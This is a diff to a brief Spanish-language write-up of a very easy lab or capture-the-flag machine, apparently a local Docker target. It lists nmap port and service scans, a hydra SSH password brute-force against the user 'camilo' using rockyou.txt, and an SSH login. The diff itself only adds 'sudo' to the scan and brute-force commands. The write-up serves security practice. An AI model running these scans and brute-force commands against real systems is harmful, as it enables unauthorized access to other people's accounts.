@@ -4,14 +4,14 @@ Dificultad: Muy Facil
 
 ping 172.17.0.2 -c 1
 
-nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
-nmap -sCV -p22,80 172.17.0.2 -oN targeted
+sudo nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+sudo nmap -sCV -p22,80 172.17.0.2 -oN targeted
 
 miramos la web
 https://172.17.0.2
 obtenemos 2 usuarios que podemos explotar
 
-hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
+sudo hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
 obtenemos password de camilo
 
 ssh camilo@172.17.0.2
